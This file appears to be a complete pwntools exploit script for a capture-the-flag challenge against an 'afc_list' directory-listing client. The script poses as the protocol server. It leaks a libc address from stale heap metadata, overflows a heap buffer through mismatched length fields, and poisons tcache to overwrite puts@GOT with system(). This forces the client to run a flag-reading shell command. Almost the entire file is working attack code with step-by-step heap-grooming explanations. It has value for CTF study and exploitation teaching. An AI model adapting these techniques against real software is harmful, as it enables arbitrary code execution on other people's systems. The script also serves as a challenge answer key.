#!/usr/bin/env python3
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional

from pwn import args, context, log, p64, remote, u64

context.arch = "amd64"
context.log_level = args.LOG_LEVEL or "info"

HOST = args.HOST or "ppp.chals.sekai.team"
PORT = int(args.PORT or 1337)

AFC_MAGIC = b"CFA6LPAA"
AFC_HEADER_SIZE = 0x28

AFC_OP_STATUS = 0x01
AFC_OP_DATA = 0x02
AFC_OP_READ_DIR = 0x03
AFC_OP_FILE_OPEN = 0x0D
AFC_OP_FILE_OPEN_RES = 0x0E
AFC_OP_FILE_READ = 0x0F
AFC_OP_FILE_CLOSE = 0x14

# Ubuntu 20.04 / bundled glibc 2.31.
SYSTEM_OFFSET = 0x52290
MALLOC_HOOK_OFFSET = 0x1ECB70
UNSORTED_FD_OFFSET = MALLOC_HOOK_OFFSET + 0x10 + 0x60

# afc_list is non-PIE and only partial RELRO.
PUTS_GOT = 0x4040A8

# Use the 0x40 tcache bin.  A 46-byte strdup input requests 47 bytes and gets
# a 0x40-sized malloc chunk under glibc 2.31.
TCACHE_CHUNK_SIZE = 0x40
STRING_LENGTH = 46
OVERWRITE_PREFIX = STRING_LENGTH - 6  # six non-NUL bytes of system()
FORGED_ALLOCATION = PUTS_GOT - OVERWRITE_PREFIX  # 0x404080, 16-byte aligned

PROMPT = b"afc> "
FLAG_COMMAND = b"/readflag sekai ppp"
FLAG_RE = re.compile(rb"SEKAI\{[^}\r\n]+\}")


@dataclass(frozen=True)
class AFCPacket:
    entire_length: int
    this_length: int
    packet_num: int
    operation: int
    body: bytes


def receive_packet(io, expected_operation: Optional[int] = None) -> AFCPacket:
    raw = io.recvn(AFC_HEADER_SIZE)
    if raw[:8] != AFC_MAGIC:
        raise RuntimeError(f"invalid AFC magic: {raw[:8]!r}")

    packet = AFCPacket(
        entire_length=u64(raw[0x08:0x10]),
        this_length=u64(raw[0x10:0x18]),
        packet_num=u64(raw[0x18:0x20]),
        operation=u64(raw[0x20:0x28]),
        body=b"",
    )

    if packet.this_length < AFC_HEADER_SIZE:
        raise RuntimeError(f"invalid AFC this_length: {packet.this_length:#x}")

    packet = AFCPacket(
        packet.entire_length,
        packet.this_length,
        packet.packet_num,
        packet.operation,
        io.recvn(packet.this_length - AFC_HEADER_SIZE),
    )

    if expected_operation is not None and packet.operation != expected_operation:
        raise RuntimeError(
            f"expected AFC operation {expected_operation:#x}, "
            f"got {packet.operation:#x}"
        )

    log.debug(
        "AFC request op=%#x packet=%d entire=%#x this=%#x body=%#x",
        packet.operation,
        packet.packet_num,
        packet.entire_length,
        packet.this_length,
        len(packet.body),
    )
    return packet


def send_packet(
    io,
    request: AFCPacket,
    operation: int,
    body: bytes = b"",
    *,
    advertised_entire_data: Optional[int] = None,
    advertised_this_data: Optional[int] = None,
) -> None:
    entire_data = len(body) if advertised_entire_data is None else advertised_entire_data
    this_data = len(body) if advertised_this_data is None else advertised_this_data

    header = b"".join(
        (
            AFC_MAGIC,
            p64(AFC_HEADER_SIZE + entire_data),
            p64(AFC_HEADER_SIZE + this_data),
            p64(request.packet_num),
            p64(operation),
        )
    )
    io.send(header + body)


def wait_prompt(io) -> bytes:
    return io.recvuntil(PROMPT)


def list_directory(io, response_data: bytes) -> bytes:
    io.sendline(b"ls /")
    request = receive_packet(io, AFC_OP_READ_DIR)
    send_packet(io, request, AFC_OP_DATA, response_data)
    return wait_prompt(io)


def perform_read(
    io,
    open_response: bytes,
    *,
    advertised_entire_data: Optional[int] = None,
    advertised_this_data: Optional[int] = None,
) -> tuple[int, bytes]:
    io.sendline(b"read x")

    open_request = receive_packet(io, AFC_OP_FILE_OPEN)
    send_packet(
        io,
        open_request,
        AFC_OP_FILE_OPEN_RES,
        open_response,
        advertised_entire_data=advertised_entire_data,
        advertised_this_data=advertised_this_data,
    )

    read_request = receive_packet(io, AFC_OP_FILE_READ)
    if len(read_request.body) < 8:
        raise RuntimeError("short FILE_READ request; leaked handle unavailable")
    leaked_handle = u64(read_request.body[:8])

    # Return EOF, then acknowledge close.
    send_packet(io, read_request, AFC_OP_DATA)
    close_request = receive_packet(io, AFC_OP_FILE_CLOSE)
    send_packet(io, close_request, AFC_OP_STATUS, p64(0))

    return leaked_handle, wait_prompt(io)


def leak_libc(io) -> tuple[int, int]:
    # Allocate a 0x510 chunk, then let afc_read_directory free it into unsorted.
    # The separators force later allocations behind it so it cannot merge with top.
    large = bytearray(b"L" * 0x500)
    for offset in (0x30, 0x61, 0x92):
        large[offset] = 0
    list_directory(io, bytes(large))

    # afc_file_open accepts one byte but memcpy()s a uint64_t.  The remaining
    # seven bytes come from stale unsorted-bin metadata and are sent back as the
    # file handle in the following FILE_READ request.
    leak, _ = perform_read(io, b"\x01")

    libc_base = (leak & ~0xFFF) - (UNSORTED_FD_OFFSET & ~0xFFF)
    system = libc_base + SYSTEM_OFFSET

    if libc_base & 0xFFF:
        raise RuntimeError(f"unaligned libc base: {libc_base:#x}")

    log.success("leaked arena pointer: %#x", leak)
    log.success("libc base: %#x", libc_base)
    log.success("system: %#x", system)
    return libc_base, system


def poison_tcache(io) -> None:
    # Parsing this response creates:
    #   C: response buffer, chunk 0x310
    #   D: char ** list, chunk 0x70
    #   E0/E1: first two strdup strings, chunks 0x40
    # Reverse cleanup leaves tcache[0x40] as E0 -> E1.
    first = b"P" * STRING_LENGTH
    second = b"Q" * STRING_LENGTH
    grooming = first + b"\0" + second + b"\0" + b"\0" * 9
    grooming += b"R" * (0x300 - len(grooming))
    assert len(grooming) == 0x300
    list_directory(io, grooming)

    # Reuse C but advertise a shorter total payload than the current fragment.
    # afc_receive_data allocates from entire_length and receives this_length,
    # overflowing through D into the freed E0 tcache entry.
    overflow = bytearray(b"V" * 0x388)
    overflow[:8] = p64(1)                       # valid nonzero file handle
    overflow[0x300:0x308] = p64(0)              # D.prev_size
    overflow[0x308:0x310] = p64(0x71)           # D.size
    overflow[0x370:0x378] = p64(0x70)           # E0.prev_size
    overflow[0x378:0x380] = p64(TCACHE_CHUNK_SIZE | 1)  # E0.size = 0x41
    overflow[0x380:0x388] = p64(FORGED_ALLOCATION)      # E0->next

    perform_read(
        io,
        bytes(overflow),
        advertised_entire_data=0x300,
        advertised_this_data=len(overflow),
    )
    log.success(
        "tcache[%#x] poisoned toward %#x",
        TCACHE_CHUNK_SIZE,
        FORGED_ALLOCATION,
    )


def trigger(io, system: int) -> bytes:
    # The first 0x40 allocation consumes E0 and contains a valid shell command.
    # A '#' starts a shell comment, allowing padding without changing behavior.
    command = FLAG_COMMAND + b" #"
    command += b"X" * (STRING_LENGTH - len(command))
    assert len(command) == STRING_LENGTH

    # The second 0x40 allocation is returned at 0x404080.  Forty filler bytes
    # cover GOT slots that are no longer needed, then six system address bytes
    # land at puts@GOT. strdup's NUL writes the two zero high bytes.
    overwrite = b"A" * OVERWRITE_PREFIX + p64(system)[:6]
    assert len(overwrite) == STRING_LENGTH
    assert FORGED_ALLOCATION % 0x10 == 0
    assert FORGED_ALLOCATION + OVERWRITE_PREFIX == PUTS_GOT

    response = command + b"\0" + overwrite + b"\0"

    io.sendline(b"ls /")
    request = receive_packet(io, AFC_OP_READ_DIR)
    send_packet(io, request, AFC_OP_DATA, response)

    log.success(
        "puts@GOT overwritten without touching free@GOT; executing %r",
        FLAG_COMMAND,
    )

    # Cleanup will eventually abort because list[1] is a forged non-heap pointer.
    # The flag is printed by the first print_names() call before that abort.
    return io.recvall(timeout=8)


def exploit_once() -> bytes:
    io = remote(HOST, PORT)
    try:
        wait_prompt(io)
        _, system = leak_libc(io)
        poison_tcache(io)
        return trigger(io, system)
    finally:
        io.close()


def main() -> None:
    attempts = int(args.ATTEMPTS or 3)
    combined = b""

    for attempt in range(1, attempts + 1):
        log.info("attempt %d/%d", attempt, attempts)
        try:
            output = exploit_once()
            combined += output
            match = FLAG_RE.search(output)
            if match:
                flag = match.group().decode(errors="replace")
                print(f"<FLAG>{flag}</FLAG>")
                return
            log.warning("flag not found; tail=%r", output[-300:])
        except Exception as exc:
            log.warning("attempt %d failed: %s", attempt, exc)

    if combined:
        print(combined.decode(errors="replace"))
    raise SystemExit("[-] exploit completed without a flag")


if __name__ == "__main__":
    main()
